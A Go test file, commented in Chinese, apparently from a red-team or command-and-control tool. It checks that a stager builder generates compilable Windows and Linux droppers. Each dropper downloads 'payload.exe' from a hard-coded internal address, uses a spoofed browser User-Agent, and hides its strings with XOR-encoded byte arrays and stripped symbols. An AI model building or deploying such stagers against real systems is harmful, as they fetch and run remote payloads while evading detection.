package stager

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// TestGenerateSourceCodeCompiles 验证 Windows/Linux 模板生成源码可编译
//（覆盖 URL/UA 字节数组拼接 + XorKey 解密函数注入的模板正确性）
func TestGenerateSourceCodeCompiles(t *testing.T) {
	// 检查 go 工具链
	if _, err := exec.LookPath("go"); err != nil {
		t.Skip("go 工具链不可用，跳过")
	}

	cases := []struct {
		name string
		os   string
	}{
		{"windows", "windows"},
		{"linux", "linux"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			sb := NewStagerBuilder(&StagerConfig{
				DownloadURL: "http://192.168.0.102:8089/d/ab12cd/full/payload.exe",
				UserAgent:   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
				Timeout:     30,
				Arch:        "x64",
				OS:          c.os,
				SleepTime:   3,
				MaxRetries:  3,
				Password:    "secret",
				XorKey:      0x5A,
			})
			if err := sb.GenerateSourceCode(); err != nil {
				t.Fatalf("GenerateSourceCode: %v", err)
			}
			src := sb.GetSourceCode()
			if len(src) == 0 {
				t.Fatal("生成的源码为空")
			}

			// 编译验证
			dir := t.TempDir()
			f := filepath.Join(dir, "main.go")
			if err := os.WriteFile(f, []byte(src), 0644); err != nil {
				t.Fatal(err)
			}
			env := append(os.Environ(), "GOOS="+c.os, "GOARCH=amd64", "CGO_ENABLED=0")
			out := filepath.Join(dir, "stager")
			if c.os == "windows" {
				out += ".exe"
			}
			cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-o", out, f)
			cmd.Env = env
			if b, err := cmd.CombinedOutput(); err != nil {
				t.Fatalf("编译失败: %v\n%s", err, b)
			}
		})
	}
}

// TestStrBytesLiteral 验证字节数组字面量生成
func TestStrBytesLiteral(t *testing.T) {
	got := strBytesLiteral("abc")
	want := "97,98,99"
	if got != want {
		t.Fatalf("strBytesLiteral(abc) = %q, want %q", got, want)
	}
	if strBytesLiteral("") != "0" {
		t.Fatal("空字符串应生成 0")
	}
}
